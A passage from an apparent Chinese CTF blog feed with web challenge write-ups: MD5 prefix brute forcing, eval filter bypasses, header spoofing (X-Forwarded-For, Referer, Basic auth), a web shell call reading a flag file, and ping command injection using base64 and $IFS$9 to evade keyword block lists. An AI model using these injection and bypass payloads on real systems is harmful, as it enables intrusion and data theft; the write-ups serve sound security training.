class="hljs-comment">//我们输入的值的md5加密后的结果的前6个字符需要是c4d038</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)===<span class="hljs-string">&quot;c4d038&quot;</span>)&#123;<br>        <span class="hljs-comment">//对我们输入的e_v.a.l参数进行过滤</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用脚本爆破md5:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> hashlib<br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> (i &lt;= <span class="hljs-number">10000000</span>):<br>    md5 = hashlib.md5()<br>    s = <span class="hljs-built_in">str</span>(i)<br>    md5.update(s.encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    result = md5.hexdigest()<br>    <span class="hljs-keyword">if</span> result[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-string">&quot;c4d038&quot;</span>:<br>        <span class="hljs-built_in">print</span>(result)<br>        <span class="hljs-built_in">print</span>(s)<br>    i = i+<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">c4d038b4bed09fdb1471ef51ec3a32cd<br>114514<br></code></pre></td></tr></table></figure><p>php非法传参介绍：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">我们传入的参数中存在_则会被php替换成[,但是我们传入的参数中是[则会被替换成_<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">password=114514&amp;e[v.a.l=echo `l\s /`;//使用转义字符法绕过过滤<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927141744793.png" alt="image-20230927141744793"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">password=114514&amp;e[v.a.l=echo `tac /fl\ag`;//在命令执行时\会被自动去除<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927141826484.png" alt="image-20230927141826484"></p><h2 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h2><p><img src="/images/2023-10-4-Newstar-1/image-20231001174106677.png" alt="image-20231001174106677"></p><p>发现用户登录界面，我们先注册一个账户,一般先注册一下admin,看一下这个系统中是否存在admin账户:<br><img src="/images/2023-10-4-Newstar-1/image-20231001174230138.png" alt="image-20231001174230138"></p><p>发现已经存在admin账户，猜测网站可以使用弱密码本爆破，通过抓包，我们发现password的传输是通过md5的形式传输，所以我们需要md5弱密码本进行爆破:</p><p><img src="/images/2023-10-4-Newstar-1/image-20231001204748276.png" alt="image-20231001204748276"></p><p><img src="/images/2023-10-4-Newstar-1/image-20231001204814702.png" alt="image-20231001204814702"></p><p>最终我们通过在md5密码本中查找，发现admin的密码是000000</p><p>使用bp抓取登录信息:</p><p><img src="/images/2023-10-4-Newstar-1/image-20231001174542432.png" alt="image-20231001174542432"></p><p>点击发送，抓取第二个传输的包:<br><img src="/images/2023-10-4-Newstar-1/image-20231001174616160.png" alt="image-20231001174616160"></p><p>将第二个包发送到重发器中,然后点击发送，获取响应信息:<br><img src="/images/2023-10-4-Newstar-1/image-20231001174814623.png" alt="image-20231001174814623"></p><p>最终我们在302响应界面中发现被注释的flag信息</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CNSS [Easy] ezhttp题解</title>
    <link href="/2023/09/25/2023-09-25-CNSS_ezhttp/"/>
    <url>/2023/09/25/2023-09-25-CNSS_ezhttp/</url>
    
    <content type="html"><![CDATA[<h3 id="CNSS-Easy-ezhttp"><a href="#CNSS-Easy-ezhttp" class="headerlink" title="CNSS  [Easy] ezhttp"></a>CNSS  [Easy] ezhttp</h3><p>1.查看题目描述:<br><img src="/images/2023-9-25-cnss-ezhttp/image-20230814101917413.png" alt="image-20230814101917413"></p><p>这题考查的使http的请求，猜测可能是要对http的请求头的各个字段进行修改，则使用BP查看该网站的请求头</p><p>2.BP抓包该网站:<br><img src="/images/2023-9-25-cnss-ezhttp/image-20230814102106081.png" alt="image-20230814102106081"></p><p>查看响应的内容中，有提示:只接受CNSS请求，游览器一般的请求方式为GET和POST，这里只接受CNSS请求，说明要将GET改成CNSS:<br><img src="/images/2023-9-25-cnss-ezhttp/image-20230814102241202.png" alt="image-20230814102241202"></p><p>发现得到不同的响应结果:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">只能在安卓微信内置浏览器中请求<br></code></pre></td></tr></table></figure><p>User-Agent:<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/User-Agent">User-Agent - HTTP | MDN (mozilla.org)</a></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814102841034.png" alt="image-20230814102841034"></p><p>语法:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">User-Agent: &lt;product&gt; / &lt;product-version&gt; &lt;comment&gt;<br></code></pre></td></tr></table></figure><p>浏览器通常使用的格式为：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">User-Agent: Mozilla/&lt;version&gt; (&lt;system-information&gt;) &lt;platform&gt; (&lt;platform-details&gt;) &lt;extensions&gt;<br></code></pre></td></tr></table></figure><p>指令:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;product&gt;<br>产品识别码。<br><br>&lt;product-version&gt;<br>产品版本号。<br><br>&lt;comment&gt;<br>零个或多个关于组成产品信息的注释。<br></code></pre></td></tr></table></figure><p>以火狐的UA为例:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814103215869.png" alt="image-20230814103215869"></p><p>示例:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0<br>Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0<br></code></pre></td></tr></table></figure><p>所以UA是用于表示该网页内容通过什么浏览器和设备进行访问的</p><p>由题目提示得:只能在安卓微信内置浏览器中请求.</p><p>所以我们得构造一个UA让其变为安卓微信内置浏览器中请求:<br>payload（通用）:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">User-Agent: Mozilla/5.0 (Linux; Android 10; XXX Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36 MicroMessenger/8.0.0.1920(0x2800004D) Process/appbrand2 WeChat/arm32<br></code></pre></td></tr></table></figure><p>得到响应结果:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814103557930.png" alt="image-20230814103557930"></p><p>得到提示:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">只接受来自cnss.io的请求<br></code></pre></td></tr></table></figure><p>Referer：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Referer">Referer - HTTP | MDN (mozilla.org)</a></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814104023049.png" alt="image-20230814104023049"></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814104054349.png" alt="image-20230814104054349"></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814104124465.png" alt="image-20230814104124465"></p><p>所以该headers字段表示的是当前页面的是通过哪个源页面中的链接进行访问的，提示得只接受来自cnss.io的请求</p><p>说明需要设置该页面的源页面为cnss.io：<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Referer:cnss.io<br></code></pre></td></tr></table></figure><p>由于当前页面的headers中没有Referer字段所以需要手动添加该字段:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814104519850.png" alt="image-20230814104519850"></p><p>得到提示:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">只接受来自本机的请求<br></code></pre></td></tr></table></figure><p>X-Forwarded-For:<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Forwarded-For">X-Forwarded-For - HTTP | MDN (mozilla.org)</a></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814104909323.png" alt="image-20230814104909323"></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814105227509.png" alt="image-20230814105227509"></p><p>实例：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For: 2001:db8:85a3:8d3:1319:8a2e:370:7348<br><br>X-Forwarded-For: 203.0.113.195<br><br>X-Forwarded-For: 203.0.113.195, 2001:db8:85a3:8d3:1319:8a2e:370:7348<br><br>X-Forwarded-For: 203.0.113.195,2001:db8:85a3:8d3:1319:8a2e:370:7348,150.172.238.178<br></code></pre></td></tr></table></figure><p>由提示得只接受来自本机的请求，所以表示该页面的客户端IP地址需要是本机的IP地址即:127.0.0.1</p><p>所以可以伪造X-Forwarded-For的内容为本机地址:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:127.0.0.1<br></code></pre></td></tr></table></figure><p>响应结果:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814105841408.png" alt="image-20230814105841408"></p><p>得到提示:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">只接受内容类型为application/json的请求<br></code></pre></td></tr></table></figure><p>Content-Type:<br><img src="/images/2023-9-25-cnss-ezhttp/image-20230814110543771.png" alt="image-20230814110543771"></p><p>所以由提示得浏览器的发送内容的类型为:application&#x2F;json</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Content-Type: application/json<br></code></pre></td></tr></table></figure><p>响应结果:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814110832040.png" alt="image-20230814110832040"></p><p>得到提示:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">你倒是发个json过来啊<br></code></pre></td></tr></table></figure><p>json数据:<a href="https://zhuanlan.zhihu.com/p/74151127">JSON数据格式详解 - 知乎 (zhihu.com)</a>:</p><p>基本形式:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;obj1&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;value1&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;obj2&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;123456&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-comment">//数值也需要加引号</span><br>    <span class="hljs-attr">&quot;obj3&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-comment">//嵌套型</span><br>        <span class="hljs-attr">&quot;obj4&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;value2&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;obj5&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;value3&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>根据提示需要传送一个json数据，由于该游览器的请求为CNSS所以我们不知道该在哪里传输json数据，猜测该请求的传送数据格式和POST类似:</p><p>构造payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;hacker&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>响应结果:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814111723058.png" alt="image-20230814111723058"></p><p>得到提示:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">能告诉我你的名字(name)吗？<br></code></pre></td></tr></table></figure><p>由于headers中不存在name字段，所以该字段需要我们通过json进行传输:<br>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>响应结果:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814112529893.png" alt="image-20230814112529893"></p><p>得到提示:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">能告诉我你的密码(password)吗？<br></code></pre></td></tr></table></figure><p>说明还需要传输一个password字段的值:</p><p>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;123456&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>响应结果:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814112928181.png" alt="image-20230814112928181"></p><p>根据提示我们需要在Cookie中写上name字段的值,保险起见与json中的内容一致:</p><p>Cookie:<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cookie">Cookie - HTTP | MDN (mozilla.org)</a></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814113511260.png" alt="image-20230814113511260"></p><p>语法:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie: &lt;cookie-list&gt;<br>Cookie: name=value<br>Cookie: name=value; name2=value2; name3=value3<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814113558180.png" alt="image-20230814113558180"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie:name=&quot;admin&quot;<br></code></pre></td></tr></table></figure><p>响应结果:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814113202256.png" alt="image-20230814113202256"></p><p>根据提示需要在Cookie中添加password字段:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie:name=&quot;admin&quot;;password=&quot;123456&quot;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814113321059.png" alt="image-20230814113321059"></p><p>BasicAuth认证<a href="https://zhuanlan.zhihu.com/p/64584734">秒懂HTTP基本认证(Basic Authentication) - 知乎 (zhihu.com)</a>：</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814123944756.png" alt="image-20230814123944756"></p><p>根据提示得我们需要进行BasicAuth认证，即认证我们输入的用户名和密码,需要添加Authorization字段:</p><p>admin:123456的base64格式为YWRtaW46MTIzNDU2</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Authorization: Basic YWRtaW46MTIzNDU2<br></code></pre></td></tr></table></figure><p>响应结果:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814124235654.png" alt="image-20230814124235654"></p><p>flag &#x3D; cnss{y0u_kn0w_h77p_r3qu3st_h4h4!}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Polar秋季个人赛WEB_WP</title>
    <link href="/2023/09/24/2023-09-24-polar%E7%A7%8B%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/"/>
    <url>/2023/09/24/2023-09-24-polar%E7%A7%8B%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="Polar秋季个人赛WEB-WP"><a href="#Polar秋季个人赛WEB-WP" class="headerlink" title="Polar秋季个人赛WEB_WP"></a>Polar秋季个人赛WEB_WP</h1><h4 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload:"></a>ezupload:</h4><p><img src="/images/2023-9-24-Polar/image-20230923092810825.png" alt="image-20230923092810825"></p><p>url:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">http://2469cefa-72d1-4f8f-a274-87b44a1cc826.www.polarctf.com:8090/uploads/pass1.php<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">pass=system(&#x27;cat ../flag.php&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923092840078.png" alt="image-20230923092840078"></p><h4 id="再来ping一波啊"><a href="#再来ping一波啊" class="headerlink" title="再来ping一波啊"></a>再来ping一波啊</h4><p>payload:</p><p>base64绕过法格式:使用$IFS$9代替空格，sh代替bash</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1|echo$IFS$9Y2F0IC4vaW5kZXgucGhw|base64$IFS$9-d|sh<br></code></pre></td></tr></table></figure><p>dir &#x2F;</p><p><img src="/images/2023-9-24-Polar/image-20230923101128445.png" alt="image-20230923101128445"></p><p>dir ..&#x2F;..&#x2F;:<br><img src="/images/2023-9-24-Polar/image-20230923101348330.png" alt="image-20230923101348330"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1|dir<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923102308231.png" alt="image-20230923102308231"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1|echo cat ./index.php|base64 -d|bash<br>=&gt;使用base64绕过法<br>127.0.0.1|echo$IFS$9Y2F0IC4vaW5kZXgucGhw|base64$IFS$9-d|sh<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1|dir$IFS$9..:返回上一级目录<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923101845558.png" alt="image-20230923101845558"></p><p>查看网页源代码:</p><p><img src="/images/2023-9-24-Polar/image-20230923101955812.png" alt="image-20230923101955812"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>PolarD&amp;N CTF<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-top: 300&quot;</span>&gt;</span>来做个复习<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ip&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Why not try bjut.edu.cn&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-left:20;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>确定<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>PolarD&amp;N CTF<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-top: 300&quot;</span>&gt;</span>来做个复习<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ip&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Why not try bjut.edu.cn&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-left:20;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>确定<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta">    $flag = &#x27;flag&#123;ae5eb824ef87499f644c3f11a7176157&#125;&#x27;;</span><br><span class="hljs-meta">if(isset($_GET[&#x27;ip&#x27;]))&#123;</span><br><span class="hljs-meta">$ip = $_GET[&#x27;ip&#x27;];</span><br><span class="hljs-meta">if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|\&gt;|`|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span><br><span class="hljs-meta">print_r($match);</span><br><span class="hljs-meta">print($ip);</span><br><span class="hljs-meta">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="hljs-meta">echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span><br><span class="hljs-meta">die(&quot;fxck your symbol!&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span><br><span class="hljs-meta">die(&quot;空格我可没加难度这可真是复习，/斜眼笑&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span><br><span class="hljs-meta">die(&quot;Bash is not allowed&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">else if(preg_match(&quot;/ls/&quot;, $ip))&#123;</span><br><span class="hljs-meta">die(&quot;我很抱歉，其实你得再研究研究&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">        else if(preg_match(&quot;/cat|tac|sort|head|tail|more|less/&quot;, $ip))&#123;</span><br><span class="hljs-meta">die(&quot;常用的读取命令肯定不行，你要是想出绕过的也算你厉害。但过滤机制是改了的-。-，你再研究研究？&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">else if(preg_match(&quot;/rm/&quot;, $ip))&#123;</span><br><span class="hljs-meta">die(&quot;你要搞我？？？&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">else if(preg_match(&quot;/index/&quot;,$ip))&#123;</span><br><span class="hljs-meta">die(&quot;那能让你直接读？&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">$a = system(&quot;ping -c 4 &quot;.$ip);</span><br><span class="hljs-meta">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="hljs-meta">print_r($a);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">&lt;!--其实就是出题人太懒了--&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><br><br><br><br><br><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span><span class="hljs-comment">&lt;!--其实就是出题人太懒了--&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="wu"><a href="#wu" class="headerlink" title="wu:"></a>wu:</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 